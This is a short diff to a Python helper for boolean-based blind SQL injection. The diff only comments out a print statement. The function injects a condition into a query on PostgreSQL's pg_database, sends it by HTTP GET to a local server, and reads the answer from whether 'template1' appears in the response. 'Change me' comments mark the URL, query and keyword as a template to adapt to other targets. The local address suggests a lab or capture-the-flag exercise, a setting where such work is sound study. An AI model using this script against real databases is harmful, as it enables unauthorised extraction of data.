@@ -5,7 +5,7 @@ from itertools import repeat
 def boolean_based_blind(condition):
     url = 'http://127.0.0.1:8789/?query=' # change me
     query = f"SELECT datname FROM pg_database WHERE {condition}" # change me
-    print(query)
+    # print(query)
     response = requests.get(url+query) # maybe change me
 
     if 'template1' in response.text: # change me to other keyword or length
